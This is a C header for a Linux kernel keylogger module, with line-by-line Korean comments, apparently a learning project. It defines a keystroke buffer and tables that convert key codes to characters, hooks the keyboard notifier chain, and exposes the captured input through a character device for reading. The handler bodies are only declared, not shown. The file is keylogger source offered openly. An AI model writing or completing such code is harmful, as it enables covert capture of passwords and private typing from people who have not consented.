#ifndef KEY_LOGGER_H //KEY_LOGGER_H가 정의되지 않았다면 KEY_LOGGER_H를 정의한다. 
#define KEY_LOGGER_H

#include <linux/fs.h> //헤더파일
#include <linux/types.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>

#define KLG_MAJOR   60 //전처리
#define BUFF_LENGTH 1024
#define FIRST_CD    KEY_1 //'1'
#define LAST_CD     KEY_SLASH //'/'

char buffer[BUFF_LENGTH+1]; //버퍼 배열 선언
char* bptr = buffer; //버퍼 배열의 시작 주소를 bptr변수에 저장한다.
const char* endptr = (buffer+sizeof(buffer)-1); //버퍼 배열의 마지막 주소를 endptr에 저장한다.
const char ch_table[] = {'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\r', //const를 이용하여 배열을 전부 상수화시킴.
		   '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
		   'X', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', 'X',
		   'X', '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'};

const char shifted_ch_table[] = { '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', '\r', //const를 이용하여 배열을 전부 상수화시킴.
		   '\t', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '{', '}', '\n',
		   'X', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ':', '|', 'X',
		   'X', '\\', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', '<', '>', '?'};

inline char get_ascii(int code) { //inline함수로 컴파일시 치환하는 아스키코드값을 얻는 함수 정의
	if((code < FIRST_CD || code > LAST_CD) && code != KEY_SPACE) return 'X'; //만약에 범위 외의 문자라면 X를 반환
	else if(code == KEY_SPACE) return ' '; //스페이스라면 공백을 반환
	
	return ch_table[(code-FIRST_CD)]; //해당 문자를 반환
}
inline char shifted_get_ascii(int code) { //inline함수로 컴파일시 치환하는 아스키코드값을 얻는 함수 정의
	if ((code < FIRST_CD || code > LAST_CD) && code != KEY_SPACE) return 'X'; //만약에 범위 외의 문자라면 X를 반환
	else if (code == KEY_SPACE) return ' '; //스페이스라면 공백을 반환

	return shifted_ch_table[(code - FIRST_CD)]; //해당 문자를 반환
}
int klg_open(struct inode *inode, struct file *filp); //klg_open 함수 선언
ssize_t klg_read(struct file *filp, char *buf, size_t count, loff_t *f_pos); //klg_read함수 선언
void klg_exit(void); //klg_exit함수 선언
int klg_init(void); //klg_init함수 선언
int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* param); //kbd_notifier함수 선언

struct file_operations klg_fops = { //함수들을 정의하는 구조체
  .owner = THIS_MODULE,             //read, open에 대해 klg_read, klg_open함수와 연결됨
  .read = klg_read,
  .open = klg_open
};

struct notifier_block nb = {
  .notifier_call = kbd_notifier //notifielr_call에 대해 kbd_notifier 함수로 연결됨
};

#endif
